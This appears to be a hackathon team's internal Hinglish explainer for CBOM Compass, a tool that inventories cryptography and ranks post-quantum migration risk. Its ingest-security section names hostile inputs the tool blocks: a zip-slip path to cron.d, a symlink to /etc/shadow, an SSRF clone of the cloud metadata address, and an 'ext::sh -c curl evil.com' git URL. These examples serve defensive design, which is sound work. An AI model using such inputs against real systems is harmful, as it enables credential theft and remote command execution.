# CBOM Compass — Poora Project Samjho (SIH25164)

> Yeh document project ka internal working explain karta hai — har file, har module,
> har algorithm, aur wo saare terms jo SIH judges pooch sakte hain.
> Sab kuch actual code se liya gaya hai, koi guess nahi.

---

## 0. Ek Line Mein Project Kya Hai

**Problem:** Quantum computer aane ke baad RSA aur ECC (elliptic curve) crypto
toot jayega. Har company ko pata hona chahiye ki unke code mein kaunsa crypto
kahan use ho raha hai, aur kaunsa pehle badalna hai.

**Solution:** CBOM Compass ek repo ya zip file scan karta hai, saara
cryptography dhoondhta hai, use **CBOM** (Cryptography Bill of Materials) banata
hai, aur har asset ko ek **priority score** deta hai — kya pehle migrate karna
hai.

**Ek line:** *"Yeh tool batata hai ki aapke code mein kaunsa crypto quantum se
todega, kahan hai, aur kis order mein theek karna hai."*

---

## 1. Basic Concepts — Judge Yeh Zaroor Poochenge

### 1.1 Quantum Computer Se Kya Toot-ta Hai?

Yeh **sabse important** point hai. Log yahan galti karte hain.

| Algorithm Type | Kya Hota Hai | Attack |
|---|---|---|
| **RSA, ECC, ECDH, ECDSA, DH** | **POORA TOOT JATA HAI** | **Shor's algorithm** |
| **AES, SHA-256** | Sirf thoda kamzor, practically safe | Grover's algorithm |
| **MD5, SHA-1, DES, RC4** | Pehle se toota hua (quantum ki zaroorat nahi) | Classical attacks |

**Shor's algorithm** — RSA ki security "integer factorisation" pe hai (bade
number ko prime factors mein todna). ECC ki security "discrete logarithm" pe
hai. Shor dono ko **polynomial time** mein solve kar deta hai. Matlab key size
badhane se kuch nahi hoga — RSA-4096 bhi toot jayega. Isko **break** kehte
hain, weakening nahi.

**Grover's algorithm** — AES/SHA ke liye sirf **quadratic speedup** deta hai.
AES-128 ki 2^128 security effectively 2^64 ho jati hai. Lekin:
- Grover **sequential** hai — parallelise nahi hota (m machines se sirf √m fayda)
- 2^64 sequential quantum operations practically impossible hain
- Hash collision ke liye **Brassard-Hoyer-Tapp** attack hota hai, jo classical
  birthday bound se practically better nahi hai (quantum memory cost ke baad)

**Isliye humara tool AES-128 aur SHA-256 ko `adequate` bolta hai.**
Yeh design decision hai — code mein `knowledge/algorithms.py` ke docstring mein
likha hai. Agar hum inko bhi "weak" bolte, to har `hashlib.sha256()` call
"act now" bucket mein aa jata aur asli RSA findings dab jaate.

> **Judge Question:** *"Hamara SHA-256 quantum se toot jayega?"*
> **Answer:** *"Nahi sir. Quantum hashing ko nahi todta. Shor sirf asymmetric
> crypto (RSA/ECC) todta hai. Hash ke liye Grover hai jo sirf quadratic
> speedup deta hai — practically safe. Humara tool SHA-256 ko 0.00 score deta
> hai, aur yeh feature hai, miss nahi."*

### 1.2 Mosca's Inequality

Yeh project ka **core formula** hai. Michele Mosca (University of Waterloo) ne
diya tha.

```
X + Y > Z   →   AAPKO PROBLEM HAI
```

| Symbol | Matlab | Kaun Deta Hai |
|---|---|---|
| **X** | Data kitne saal secret rehna chahiye (data lifetime) | **Business** — koi scanner nahi bata sakta |
| **Y** | Migration mein kitne saal lagenge | **Engineering estimate** |
| **Z** | Quantum computer kab aayega (Q-Day) | **Risk officer ka estimate** |

**Example:** Health records 20 saal secret rehne chahiye (X=20), migration mein
2 saal lagenge (Y=2), Q-Day 2035 hai aur abhi 2026 hai to Z=9 saal.
`20 + 2 = 22 > 9` → **Already late ho chuke ho.**

**Humara improvement:** Original Mosca sirf `true/false` deta hai. Usse ranking
nahi ban sakti (sab true aa jayenge). Isliye hum **signed exposure gap** use
karte hain:

```python
exposure_gap = (X + Y) - Z_years        # positive = overdue
urgency      = clamp(gap / URGENCY_SCALE, 0, 1)
```

Isse pata chalta hai *kitna buri tarah* fail ho rahe ho, sirf haan/na nahi.

### 1.3 HNDL — Harvest Now, Decrypt Later

Attacker **aaj** encrypted traffic record kar leta hai, aur **quantum aane ke
baad** decrypt karta hai. Isliye lambi-life wala data **abhi** khatre mein hai,
future mein nahi.

Code (`knowledge/mosca.py`):
```python
HNDL_DATA_CLASSES = {"pii", "health", "regulated", "defence", "financial"}
HNDL_MIN_X_YEARS = 5.0
```

Agar data class in mein hai, ya X ≥ 5 saal hai → HNDL flag lagta hai.
Dashboard mein score ke aage lal `!` dikhta hai.

### 1.4 NIST IR 8547 — Regulatory Clock

Yeh **fixed dates** hain, kisi ke estimate pe depend nahi karte:

- **2030** — RSA aur ECC **deprecated**
- **2035** — RSA aur ECC **disallowed** (ban)

**Do clock ka concept:** Humare paas do independent clocks hain —
1. **Quantum clock** (Mosca, Z pe depend karta hai — slider se badalta hai)
2. **Regulatory clock** (NIST dates, fixed hain — slider se nahi badalta)

Isliye dashboard mein likha hota hai *"13/24 scores move with Z"* — baaki 11
regulation ya break se pinned hain.

> **Judge Question:** *"Z slider ghumaya lekin RSA ka score nahi badla, bug hai?"*
> **Answer:** *"Nahi sir, wo correct hai. RSA pe NIST ki fixed deadline hai —
> regulator ki date kisi ke Q-Day estimate pe depend nahi karti. Isliye har
> finding mein `driver` field record hota hai jo batata hai kaunsa axis usko
> drive kar raha hai."*

### 1.5 PQC Algorithms — Naye Standards

| Standard | Algorithm | Kaam | Purana Naam |
|---|---|---|---|
| **FIPS 203** | **ML-KEM** | Key exchange (KEM) | Kyber |
| **FIPS 204** | **ML-DSA** | Digital signature | Dilithium |
| **FIPS 205** | **SLH-DSA** | Signature (hash-based) | SPHINCS+ |
| Draft | **FN-DSA** | Signature (chhota size) | Falcon |
| SP 800-208 | **LMS / XMSS** | Firmware signing | — |

**NIST Security Categories** (parameter set pe depend karta hai):

| Parameter Set | Category |
|---|---|
| ML-KEM-512 | 1 |
| **ML-KEM-768** | **3** ← sabse common |
| ML-KEM-1024 | 5 |
| ML-DSA-44 | 2 |
| ML-DSA-65 | 3 |
| ML-DSA-87 | 5 |

### 1.6 Hybrid Crypto

**Hybrid = purana + naya, dono saath.** Jaise `mlkem768x25519-sha256` mein
X25519 (classical) aur ML-KEM-768 (post-quantum) dono chalte hain.

**Fayda:** Agar koi ek toota bhi, to bhi connection safe hai. Chrome aur
Cloudflare production mein yahi chala rahe hain.

Humara tool **hybrid ko detect karta hai** — agar ek module mein PQC algorithm
aur classical algorithm dono mile, to classical wale ko urgent nahi manta
(score 1.00 se 0.06 ho jata hai), kyunki hybrid mein use todne se exchange nahi
tootta.

### 1.7 CBOM — Cryptography Bill of Materials

SBOM (Software BOM) software ki list hoti hai. **CBOM** cryptography ki list
hai. Standard: **CycloneDX 1.7**, `cryptographic-asset` component type ke saath.

---

## 2. Project Ki Poori File List

```
SIH/
├── cbom_compass/                  ← main Python package
│   ├── __init__.py                version number
│   ├── cli.py           (318)     command line interface
│   ├── api.py           (478)     FastAPI web server + saare endpoints
│   ├── engine.py        (241)     scan orchestration — sab scanners chalata hai
│   ├── models.py        (286)     data classes — Asset, Evidence, Risk, etc.
│   ├── policy.py        (105)     crypto-policy.yaml load karta hai
│   ├── inventory.py     (107)     de-duplication / merge logic
│   ├── risk.py          (293)     SCORING ENGINE — Mosca + formula
│   ├── recommend.py     (204)     kaunsa PQC algorithm use karo
│   ├── cbom.py          (291)     CycloneDX 1.7 export + validation
│   ├── report_pdf.py    (270)     PDF risk summary
│   ├── verify.py        (218)     "prove it" — disk se dobara padhta hai
│   ├── evaluate.py      (255)     precision/recall measurement
│   ├── ingest.py        (392)     upload + git clone (SECURITY layer)
│   ├── store.py         (143)     SQLite database + audit log
│   ├── knowledge/
│   │   ├── algorithms.py (313)    kaunsa algorithm broken/adequate hai
│   │   ├── libraries.py  (124)    library → algorithms mapping
│   │   └── mosca.py      (85)     X, Y defaults aur HNDL rules
│   ├── scanners/
│   │   ├── base.py       (39)     Scanner base class
│   │   ├── source.py     (502)    SOURCE CODE scanner (sabse bada)
│   │   ├── dependencies.py (144)  requirements.txt, package.json, pom.xml
│   │   ├── binary.py     (276)    ELF/PE/Mach-O import table (LIEF)
│   │   ├── container.py  (194)    Docker image layers
│   │   ├── tls.py        (175)    live TLS handshake
│   │   └── cloud.py      (222)    AWS KMS / key store export
│   └── web/
│       └── index.html             POORA dashboard (HTML+CSS+JS, single file)
├── tests/                         194 tests
├── corpus/                        57 hand-labelled examples (accuracy proof)
├── samples/                       jaanbujh kar vulnerable sample app
├── crypto-policy.yaml             business tagging (X, criticality)
└── pyproject.toml                 dependencies
```

### Har File Ka Kaam — Detail Mein

**`cli.py`** — Terminal commands: `scan`, `serve`, `export`, `diff`,
`validate`, `verify`, `eval`. Har command ka apna handler function hai.

**`api.py`** — FastAPI server. Saare HTTP endpoints. Role-based access gate
(`_require`) yahan hai — Z aur criticality weights sirf `risk_officer` badal
sakta hai kyunki wo poore system ke score badal dete hain.

**`engine.py`** — Orchestrator. `run_scan()` saare scanners ko loop mein
chalata hai. **Important:** ek scanner crash ho to baaki 5 nahi rukte —
per-source error banner dikhta hai (`try/except` har target pe).

**`models.py`** — Saare data structures. Key enums:
- `SourceType`: source_code, dependency, binary, container, endpoint, cloud_kms
- `QuantumStatus`: broken, broken_classical, deprecated_insufficient, adequate,
  unknown, not_applicable
- `Confidence`: high, medium, low
- `Criticality`: low, medium, high

**`policy.py`** — YAML se business tags load karta hai. `ServiceTag` mein path
globs hote hain jo findings ke location se match hote hain.

**`inventory.py`** — De-duplication. Ek hi OpenSSL 3.0.11 dependency scanner,
binary scanner aur container scanner teeno dhoondh lenge. Bina merge ke
Overview KPI aur Inventory row count match nahi karenge — **stage pe, live.**

**`risk.py`** — Scoring ka dil. Neeche detail mein.

**`recommend.py`** — Har finding ke liye specific standard recommend karta hai.
Generic "quantum-safe crypto" nahi bolta. Signature size bhi consider karta hai:
FN-DSA (~666 B), ML-DSA (~2420 B), SLH-DSA (~7856 B).

**`ingest.py`** — Upload aur git clone ka security layer. Sabse zyada security
work yahan hai.

**`verify.py`** — "Prove it" module. Scan ke findings ko disk se dobara padhta
hai aur actual source line quote karta hai.

**`evaluate.py`** — 57 hand-labelled examples ke against precision/recall
nikalta hai.

---

## 3. Scanning Kaise Kaam Karta Hai

### 3.1 Chhe (6) Source Types

| # | Scanner | Kya Padhta Hai | Confidence |
|---|---|---|---|
| 1 | **source** | .py, .java, .js, .go files | Python: **high**, baaki: medium |
| 2 | **dependencies** | requirements.txt, package.json, pom.xml, go.mod | medium |
| 3 | **binary** | ELF/PE/Mach-O import table (LIEF) | high |
| 4 | **container** | Docker image layers (syft ya fallback) | medium |
| 5 | **tls** | Live TLS handshake | high |
| 6 | **cloud** | AWS KMS metadata / JSON export | high |

### 3.2 Source Scanner — Sabse Important

**Python ke liye: AST parsing (Abstract Syntax Tree)**

```python
import ast
tree = ast.parse(source_code)
for node in ast.walk(tree):
    if isinstance(node, ast.Call):
        dotted_name = _dotted(node.func)     # "rsa.generate_private_key"
        if dotted_name in PY_CALL_RULES:
            algorithm = PY_CALL_RULES[dotted_name]
```

**Regex se AST kyun better hai?** Regex text match karta hai — comment, string,
variable naam sab match ho jayenge. AST **actual code structure** samajhta hai.
Isliye Python findings **high confidence** hain.

**Key size nikalna:**
```python
KEY_SIZE_ARG_INDEX = {
    "rsa.generate_private_key": 1,   # (public_exponent, key_size)
    "dh.generate_parameters": 1,     # (generator, key_size)
    "dsa.generate_private_key": 0,
}
```
`rsa.generate_private_key(65537, 2048)` mein pehla argument **public exponent**
hai, key size nahi. Naive "pehla integer" reading RSA-65537 report karti thi —
yeh bug tha, ab fix hai.

**Java/JS/Go ke liye: pattern rules.** Isliye unki confidence **medium** hai —
UI mein honestly dikhta hai.

**False positive se bachne ka rule:**
```python
hashlib.md5(data, usedforsecurity=False)   # → risk score 0, sirf inventory mein
```
Agar developer ne explicitly bola hai "yeh checksum hai, security nahi", to
score 0 milta hai. Inventory mein rehta hai completeness ke liye.

### 3.3 Scan Ka Poora Flow

```
1. INGEST      → upload/clone → workspace directory
                 (security checks: zip slip, bomb, symlink, SSRF)
       ↓
2. SCAN        → 6 scanners parallel targets pe chalte hain
                 har ek ScanResult(assets, relationships, errors) deta hai
       ↓
3. MERGE       → inventory.merge() → duplicate hatao
                 Pass 1: exact identity key
                 Pass 2: unsized absorption
       ↓
4. CLASSIFY    → risk.classify_all() → har asset ko score do
                 (hybrid detection yahan hoti hai)
       ↓
5. RECOMMEND   → recommend.recommend_all() → PQC replacement suggest karo
       ↓
6. STORE       → SQLite mein JSON document save + audit log entry
       ↓
7. RENDER      → dashboard / CBOM / PDF / CSV
```

### 3.4 De-duplication (`inventory.py`)

**Pass 1 — Exact identity key:**
```python
identity_key = sha256(algorithm | key_size | params | library@version | location)
```
Same key wale assets merge ho jate hain, unka evidence combine hota hai.

**Pass 2 — Unsized absorption:**
`crypto.generateKeyPairSync('rsa', {modulusLength: 2048})` ek hi line pe do
rules match karta hai — ek key size resolve karta hai, ek nahi. Bina size wala
finding same asset hai, to usko sized twin mein absorb kar dete hain.

**Confidence promotion:** Agar do alag techniques ne same asset dekha, to
confidence ek level upar chadh jati hai.

---

## 4. Scoring Engine (`risk.py`) — Judge Ka Favourite Topic

### 4.1 Formula

```python
vulnerability = 1.0  broken            (Shor se toot-ta hai)
                1.0  broken_classical   (MD5, DES, RC4 — already toota)
                0.8  deprecated_insufficient
                0.3  policy-only        (CNSA 2.0 ke bahar)
                0.2  unknown
                0.1  hybrid ka classical half
                0.0  adequate
                0.0  not_applicable     (library inventory row)

timing        = max(mosca_urgency, compliance, TIMING_FLOOR=0.5)

risk          = vulnerability × timing × (0.6 + 0.4 × hndl)

score         = risk × criticality_weight
                (low=0.4, medium=0.7, high=1.0)
```

### 4.2 Multiply Kyun, Max Kyun Nahi? — MOST IMPORTANT ANSWER

**Yeh real bug ki kahani hai jo project mein documented hai.**

Pehle version `max(urgency, compliance, quantum)` use karta tha. Paramiko scan
karne pe uska **already-migrated ML-KEM key exchange 0.60 score** kar gaya —
sirf isliye ki SSH session keys long-lived access protect karte hain.

**Kuch migrate karna hi nahi tha, to koi timeline usko urgent nahi bana sakti.**

Ab **vulnerability sab kuch gate karti hai:**
```
adequate ka vulnerability = 0.0
0.0 × kuch bhi = 0.0
```
Chahe data 100 saal live rahe, adequate algorithm ka score **hamesha zero**.

> **Judge Question:** *"Aapka scoring formula kya hai aur multiply kyun?"*
> **Answer:** *"Vulnerability × timing × hndl, phir criticality weight.
> Multiply isliye kyunki timing sirf existing need ko modulate karti hai, need
> banati nahi. Humne paramiko scan kiya to already-migrated ML-KEM 0.60 score
> kar gaya tha — jo bilkul wo false urgency hai jisse bachne ke liye yeh tool
> bana hai. Ab adequate algorithm hamesha zero score karta hai."*

### 4.3 TIMING_FLOOR Kyun?

```python
TIMING_FLOOR = 0.5
```
3DES session data protect kar raha hai — koi clock press nahi kar rahi. Bina
floor ke uska score zero ho jata. Weak crypto ko replace karna chahiye chahe
timeline na ho. Isliye timing kabhi zero nahi hoti.

### 4.4 Compliance Component

```python
years_left = min(deadlines) - current_year
compliance = 1.0 if years_left <= 0 else clamp((10 - years_left) / 10)
```
Deadline paas aane pe pressure badhta hai. Flat 1.0 rakhne se saare broken
assets same score pe pin ho jate the, aur phir Mosca unke beech distinguish
nahi kar pata — **aur distinguish karna hi Mosca ka poora point hai.**

### 4.5 Hybrid Detection (Naya Fix)

```python
HYBRID_CLASSICAL_VULNERABILITY = 0.1

HYBRID_PARTNERS = {
    "kem":       {"key-agree"},          # ML-KEM ↔ ECDH/DH
    "signature": {"signature", "pke"},   # ML-DSA ↔ ECDSA/RSA
}
```

Agar ek hi module mein PQC KEM aur classical key-agreement dono milein →
classical wala hybrid ka half hai:
- vulnerability 1.0 → 0.1
- **HNDL flag hat jata hai** (hybrid mein recorded traffic safe hai)
- rationale mein clearly likha jata hai

**Result:** `kex_curve25519.py` ka bare X25519 = **1.00** (still urgent),
`kex_mlkem.py` ka hybrid X25519 = **0.06**.

**Honest limitation:** Yeh heuristic hai — same file mein hona ek signal hai,
proof nahi. Rationale mein yeh saaf likha hai.

### 4.6 Urgency Bands (Heat Map ke liye)

```python
score >= 0.66  →  high
score >= 0.33  →  medium
baaki          →  low
```

---

## 5. Dashboard Ke Saare Views — Internal Working

### 5.1 New Scan

**Do raste:**
1. **Upload** — drag & drop zip/tar.gz ya single file → `POST /api/scan/upload`
2. **Repository** — public repo URL → `POST /api/scan/repo`

**Internally:**
- Upload: multipart body → `ingest_upload()` → workspace mein extract
- Repo: `normalise_repo_url()` validate → `git clone --depth 1` → `.git` delete

Dono ke baad wahi pipeline: `run_scan()` → store → dashboard reload.

**UI details:** elapsed seconds ticker (60s ka scan "hang" na lage), 10-minute
abort, network failure pe `/api/health` probe karke sach batata hai, aur
"Try again" button jo last attempt yaad rakhta hai.

### 5.2 Overview

**KPI cards** — sab `report.kpis` se aate hain:

```python
total_assets       = merge ke baad ki count
raw_findings       = merge se pehle
collapsed_by_dedup = kitne merge hue
by_status          = {broken: 10, adequate: 11, ...}
hndl_flagged       = kitne harvest-now
nist_disallowed_2035, nist_deprecated_2030
z_sensitive        = kitne scores Z ke saath hilte hain
```

**Neeche:** mini heat map + top-10 most urgent table + drift (pichhle scan se
diff).

### 5.3 Inventory Explorer

Saare assets ki filterable table. **9 columns:** score, asset, algorithm, key
size, status, criticality, confidence, sources, location.

**Filtering (`match()` function):**
```javascript
status, criticality, confidence, urgency_band, source_type ka exact match
+ free text search (name + location + library + algorithm)
```

**Sorting:** kisi bhi column header pe click, dobara click = reverse.

**Row click → detail panel:**
- rationale (kyun yeh classification)
- saare parameters, library@version
- detection technique
- **saara evidence with actual source line**
- recommendation with rotation cost aur maturity

**Score click → explain panel:** us particular score ke peeche ka Mosca ganit.

**Export scope:** Filters exports ko control karte hain —
*"Export will include 12 of 24 assets (filters active)"*. Matlab "broken +
high criticality" filter karke exactly wahi export kar sakte ho.

### 5.4 Risk Heat Map

**3×3 grid** — criticality (rows) × urgency (columns).

```python
def heat_map(risks):
    grid = {c: {u: 0 for u in ("low","medium","high")}
            for c in ("low","medium","high")}
    for r in risks.values():
        grid[r.criticality.value][r.urgency_band] += 1
    return grid
```

**Top-right cell (high criticality × high urgency) = aapka work queue.**

**Cell click → Inventory pe jaata hai us filter ke saath.** Yeh dono views ko
jodta hai: heat map batata hai kaunsa bucket, inventory batata hai kaunsi file.

**Z slider yahan live dikhta hai** — slider ghumao, grid turant recount hota
hai. Kyunki rescoring **scanners dobara nahi chalati**, sirf stored inventory se
recompute karti hai (milliseconds mein).

### 5.5 Asset Graph

**Blast radius** — ek break kahan tak cascade karega.

**Clustering (v1 ka bug fix):** Pehle top-N by score truncate karta tha, jisse
long tail chup-chaap gayab ho jati thi aur graph estimate ki shape ke baare mein
jhoot bolta tha. Ab:

```python
def significant(row):
    return row["score"] >= 0.30 or degree.get(row["id"], 0) >= 2
```
Jo assets apne aap matter karte hain wo individual node, baaki
`(algorithm, status, source)` group mein collapse hote hain **count ke saath**.
Har asset represent hota hai.

**Layout — phyllotaxis spiral + force simulation:**
```javascript
const r = 46 * Math.sqrt(i + 1), a = i * 2.39996;   // golden angle
```
Phir 300 iterations ka force simulation: repulsion + spring + centring.
Do clamps stability ke liye:
- `MIN_D2 = 144` — do coincident nodes infinite repulsion na banayein
- `MAX_V = 55` — ek bad frame node ko fling na kare

**IMPORTANT — Demo ke liye jaanna zaroori:**
Relationships sirf **dependency, binary, container aur TLS** scanners banate
hain. **Source scanner koi edge nahi banata.** Isliye pure repo/upload scan mein
graph mein **0 edges** aayenge — sirf dots. Yeh bug nahi hai, lekin bug jaisa
dikhta hai. Demo mein yeh dhyan rakhna.

### 5.6 Recommendations

Har finding ke liye specific standard:

| Kya Mila | Recommendation |
|---|---|
| RSA/ECDH key exchange | **FIPS 203 ML-KEM-768** (hybrid X25519+ML-KEM) |
| ECDSA/RSA signature | **FIPS 204 ML-DSA-65** |
| Firmware/code signing | **SP 800-208 LMS/XMSS** |
| MD5/SHA-1 | **FIPS 180-4 SHA-256** |
| Adequate | *no change* |

**Hybrid by default** — kyunki ek algorithm toota to bhi survive kar jaayenge.

### 5.7 Reports

- **CycloneDX 1.7 CBOM** (JSON)
- **PDF risk summary** (3 pages)
- **CSV** (13 columns)
- **Scan history** — har scan, kya scan hua, click karke wapas load kar sakte ho
- **Standard conformance** — CycloneDX validation result

### 5.8 Settings

Z year, criticality weights, service tags, scan allowlist, audit log.
Yeh sab **risk_officer-only** hain kyunki poore system ke score badal dete hain.

---

## 6. Security — Upload Ka Untrusted Edge

`ingest.py` sabse zyada security-critical file hai. Yahan **user ka data**
aata hai.

### 6.1 Zip Slip (Path Traversal)

Archive mein `../../etc/cron.d/evil` naam ki entry ho sakti hai. `extractall()`
usko waha likh dega!

```python
def _safe_member_path(root, name):
    cleaned = name.replace("\\", "/")
    if cleaned.startswith("/") or re.match(r"^[A-Za-z]:", cleaned):
        raise IngestError("absolute path")
    if any(p == ".." for p in parts):
        raise IngestError("escapes extraction root")
    target = (root / Path(*parts)).resolve()
    if root.resolve() not in target.parents:
        raise IngestError("escapes extraction root")
```

Covers: absolute paths, `..`, backslash separators, Windows drive letters.

### 6.2 Decompression Bomb (Zip Bomb)

42 KB ki file jo 4.5 PB mein expand hoti hai — yeh real attack hai.

**Key insight:** Archive header mein jo size likhi hai wo **attacker
control karta hai**. Isliye limit **actually padhe gaye bytes** pe lagti hai:

```python
while True:
    chunk = source.read(64 * 1024)
    written += len(chunk)
    if written > MAX_MEMBER_BYTES:      # 64 MB per file
        raise IngestError(...)
    budget[0] -= len(chunk)
    if budget[0] < 0:                   # 800 MB total
        raise IngestError("possible decompression bomb")
```

**Limits:** 200 MB upload, 800 MB extracted, 64 MB per file, 40,000 entries.

### 6.3 Symlinks

Archive mein `config -> /etc/shadow` symlink ho sakta hai. Scanner `rglob` +
`is_file()` use karta hai jo symlink **follow** karta hai — to wo file padhi
jaayegi aur evidence mein quote ho jaayegi!

```python
if stat.S_ISLNK(info.external_attr >> 16):
    continue                    # archive se symlink kabhi mat banao
strip_symlinks(tree)            # clone ke baad bhi hatao
```

### 6.4 SSRF (Server Side Request Forgery)

Arbitrary git URL ek **SSRF weapon** hai:
- `git clone http://169.254.169.254/...` → cloud metadata (AWS credentials!)
- `ext::sh -c 'curl evil.com'` → shell command execution

```python
ALLOWED_GIT_HOSTS = {"github.com", "gitlab.com", "bitbucket.org", "codeberg.org"}

# https only, no credentials, no submodules, ambient git config off
env = {"GIT_TERMINAL_PROMPT": "0", "GIT_CONFIG_GLOBAL": os.devnull,
       "GIT_ALLOW_PROTOCOL": "https"}
command = ["git", "-c", "core.symlinks=false", "-c", "protocol.ext.allow=never",
           "clone", "--depth", "1", "--single-branch", "--no-tags",
           "--recurse-submodules=no", clone_url, tree]
```

**Segment validation:**
```python
_REPO_SEGMENT = re.compile(r"^(?!-)(?!\.{1,2}$)[A-Za-z0-9._-]{1,100}$")
```
`(?!-)` = leading dash reject (flag jaisa dikhta hai),
`(?!\.{1,2}$)` = `.` aur `..` reject (traversal).

### 6.5 Workspace Retention

Extracted trees **delete nahi hote** — `verify` command ko chahiye. Retention
20 most recent trees tak capped hai.

### 6.6 Scan Authorization (TLS)

```python
def target_allowed(self, host):
    return any(fnmatch.fnmatch(host, p) for p in self.scan_allowlist)
```
Allowlist ke bahar live probing **refuse** hoti hai, warn nahi. Iske bina yeh
tool sirf ek network scanner hota.

---

## 7. Proof — "Aapka Output Real Hai Ya Fake?"

Yeh **sabse strong** section hai judges ke liye.

### 7.1 `verify` Command

```bash
cbom-compass verify --sample 0
```

Findings ko **disk se dobara** padhta hai. Scan se sirf location leta hai,
baaki kuch nahi:

```
PASS  RSA         python-ast
      paramiko/rsakey.py:139
      > padding=padding.PKCS1v15(),
PASS  ECDSA       binary-import-table
      /usr/bin/ssh contains 'EC_KEY_generate_key': True

24/24 independently confirmed
```

**Point:** Falsifiability. Agar tool jhooth bol raha hota, yeh fail hota.

### 7.2 `eval` Command — Measured Accuracy

```bash
cbom-compass eval --corpus corpus
```

```
corpus: 57 hand-labelled usages · 55 findings · 4 negative controls

metric set    precision    recall      F1     TP   FP   FN
algorithm       100.0%    95.7%    0.98     45    0    2
strict           98.2%    94.7%    0.96     54    1    3

negative controls: 0 findings on 4 files that should yield none
```

**Do metric sets kyun?**
- **algorithm** — usage notice kiya ya nahi (file + algorithm)
- **strict** — har attribute (key size, mode, curve) bhi sahi hona chahiye

Gap = attribute extraction ki cost, alag se dikhna chahiye.

**Negative controls** — 4 files jinme kuch nahi milna chahiye. 0 findings aaye.
Yeh false positive rate prove karta hai.

**Tool apni misses bhi batata hai:**
```
missed: hashlib.new(ALGORITHM) — algorithm from env at runtime
missed: getattr(hashlib, 'sha1') — indirect resolution
```
Yeh honesty clean sheet se zyada strong evidence hai.

### 7.3 Official CycloneDX Validation

CycloneDX specification repo se **official 1.7 JSON Schema** download karke
validate kiya:
```
Validating against the OFFICIAL CycloneDX 1.7 schema
  components: 24
  RESULT: VALID — 0 schema errors
```

### 7.4 194 Tests

```bash
.venv/bin/python -m pytest tests -q
# 194 passed
```

---

## 8. Judges Ke Liye Q&A — Ratna Mat, Samajhna

**Q: Yeh tool exactly karta kya hai?**
A: Code scan karke saara cryptography dhoondhta hai, CycloneDX 1.7 CBOM banata
hai, aur har asset ko priority score deta hai — kya pehle migrate karna hai.

**Q: Quantum computer hamara data kaise todega?**
A: Shor's algorithm RSA/ECC ka **hard problem hi solve** kar deta hai — key size
badhane se kuch nahi hoga. Hashing (SHA-256) safe hai — uske liye sirf Grover
hai jo quadratic speedup deta hai, practically infeasible.

**Q: Mosca inequality kya hai?**
A: X + Y > Z. Data lifetime + migration time > Q-Day tak ka time = problem.
Hum signed gap use karte hain boolean nahi, taaki ranking ban sake.

**Q: Score 0.42 ka matlab kya?**
A: vulnerability × timing × hndl × criticality_weight. Dashboard mein score pe
click karo — poora Mosca ganit dikh jaayega, har input ke saath.

**Q: X aur Y kahan se aate hain?**
A: X business fact hai (data kitna secret rehna chahiye) — koi scanner nahi
bata sakta. `crypto-policy.yaml` mein tag karte hain. Untagged assets 7-year
default lete hain aur UI mein **"assumed"** badge lagta hai. Y deployment
surface se estimate hota hai.

**Q: False positives kaise handle karte ho?**
A: Teen tarike — (1) Python mein AST parsing regex ki jagah, (2)
`usedforsecurity=False` respect karte hain, (3) har finding pe confidence label
hota hai. Aur 4 negative controls corpus mein hain jinpe 0 findings aate hain.

**Q: Ye kaise pata chalega ki output real hai?**
A: `verify` command chalao — har finding disk se dobara padhta hai aur actual
source line quote karta hai. 24/24 confirmed. Aur `eval` se 100% precision,
95.7% recall measured hai.

**Q: Kya isko industry abhi use kar sakti hai?**
A: Internal network pe haan — scanning, ingest security, exports sab ready
hain. Public internet ke liye **authentication chahiye** — abhi role gate
header-based hai (`X-Role`), jo demo model hai. SSO proxy ke peeche daalna
padega.

**Q: Aapka differentiator kya hai?**
A: Teen cheezein — (1) **Scoring jo false urgency avoid karti hai**:
already-migrated ML-KEM zero score karta hai, (2) **Falsifiability**: `verify`
command se koi bhi finding hand-check kar sakta hai, (3) **Measured accuracy**:
57 labelled examples ke against precision/recall published hai, misses ke saath.

**Q: Kya limitation hai?**
A: Honest list —
- semgrep aur sslyze integrate nahi hain (Phase 2, stub nahi kiya kyunki
  output discard karne wala stub gap se bhi bura hota hai)
- Runtime-resolved algorithms detect nahi hote (`hashlib.new(env_var)`)
- Source-only scan mein asset graph mein 0 edges aate hain
- Authentication production-grade nahi hai
- Scans synchronous hain — bade repo pe HTTP request lambi chalti hai

**Q: Kitna data scan kar sakta hai?**
A: Tested — pyca/cryptography (130 MB, 3047 files) **27.6 seconds** mein 1342
assets. Upload limit 200 MB, extracted 800 MB.

---

## 9. Demo Chalane Ka Tarika

```bash
# 1. Setup
python3 -m venv .venv && .venv/bin/pip install -e ".[dev]"

# 2. Server chalao
.venv/bin/python -m cbom_compass.cli serve --policy crypto-policy.yaml

# 3. Browser: http://127.0.0.1:8000
#    → "New scan" pe zip drop karo, ya repo URL daalo
```

**Terminal proof (judges ke saamne):**
```bash
cbom-compass eval --corpus corpus     # accuracy numbers
cbom-compass verify --sample 0        # har finding disk se confirm
```

**Demo ke liye acche repos:**

| Repo | Kya Dikhega |
|---|---|
| `github.com/paramiko/paramiko` | **Best** — ML-KEM (adequate 0.00) broken RSA ke saath, saare 4 status |
| `github.com/jpadilla/pyjwt` | Sabse simple — 6 assets, sab RSA broken |
| `github.com/golang/crypto` | Widest — 14 alag algorithms |
| `github.com/pyca/cryptography` | Stress test — 1342 assets, 27s |

**Demo tip:** Library repos (pyca/cryptography, golang/crypto) mein broken
count zyada aayega — wo **expected** hai, wo jaanbujh kar purane algorithms
implement karte hain. Application repos (paramiko, pyjwt) ke findings asli
migration work represent karte hain.

---

## 10. Ek Page Ka Cheat Sheet

```
PROBLEM   → Quantum RSA/ECC todega. Kis code mein kya hai, pata nahi.
SOLUTION  → Scan → CBOM → Priority score

FORMULA   → risk = vulnerability × timing × (0.6 + 0.4×hndl)
            score = risk × criticality_weight
            MULTIPLY kyun? Timing need banati nahi, sirf modulate karti hai.

MOSCA     → X (data life) + Y (migration) > Z (Q-Day) = problem
            X business deta hai, Y engineering, Z risk officer

CLOCKS    → Quantum clock (Z, slider se hilta hai)
            Regulatory clock (NIST IR 8547: 2030 deprecated, 2035 disallowed)

STATUS    → broken (Shor) | broken_classical (MD5/SHA-1)
            deprecated_insufficient | adequate | not_applicable

PQC       → FIPS 203 ML-KEM (KEM) | FIPS 204 ML-DSA (sign)
            FIPS 205 SLH-DSA | SP 800-208 LMS/XMSS (firmware)

HYBRID    → classical + PQC saath. Ek toota to bhi safe.
            Humara tool hybrid ka classical half urgent nahi manta (0.06)

PROOF     → verify: 24/24 confirmed from disk
            eval: 100% precision, 95.7% recall, 4 negative controls
            official CycloneDX 1.7 schema: 0 errors
            194 tests passing

